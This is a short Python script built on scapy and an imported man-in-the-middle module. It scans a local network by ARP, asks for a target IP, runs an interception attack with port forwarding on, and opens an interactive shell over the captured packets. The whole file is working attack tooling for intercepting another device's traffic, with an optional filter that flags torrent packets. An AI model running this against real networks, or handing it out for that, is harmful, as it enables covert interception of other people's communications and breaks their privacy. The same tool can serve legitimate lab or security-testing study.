#!/usr/bin/env python3
from scapy.all import *
from mitm import MITMAttack, LinuxPortForwarding
import subprocess

def filter_out_torrent(p):
    torrent_ports = list(range(6881, 6889+1)) + [6969, 4662]  # + [bittorrent tracker, eDonkey]
    if TCP in p and (p[TCP].sport in torrent_ports or p[TCP].dport in torrent_ports):
        print("Intercepted torrent packet", p.direction)
        print(p.show())
        return False
    else:
        return p

def get_network_mask():
    ip_addr = subprocess.run(["ip", "addr"], stdout=subprocess.PIPE).stdout.decode('utf-8')
    inet_line = [line for line in ip_addr.split("\n") if conf.iface in line and "inet" in line][0]
    return inet_line.split()[1]

def scan_network(network):
    print("Scanning network...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False)
    print("Devices in network:")
    for _, packet in ans:
        print(f"    {packet.psrc} at {packet.hwsrc}")

def main():
    network = get_network_mask()
    print("Network mask:", network)

    target = input("Target's IP (empty to scan network): ")
    while target == "":
        scan_network(network)
        target = input("Target's IP (empty to re-scan): ")

    mitm = MITMAttack(
            target_ip=target,
            # user_filter=filter_out_torrent,
            verbose=True)
    with LinuxPortForwarding():
        packets = mitm.run()
    # TODO: remove
    x = packets.filter(lambda p: IP in p and (p[IP].src == target or p[IP].dst == target))
    import code
    code.interact(local=locals(), banner=f"{len(packets)} packets in variable `packets`")

if __name__ == "__main__":
    main()
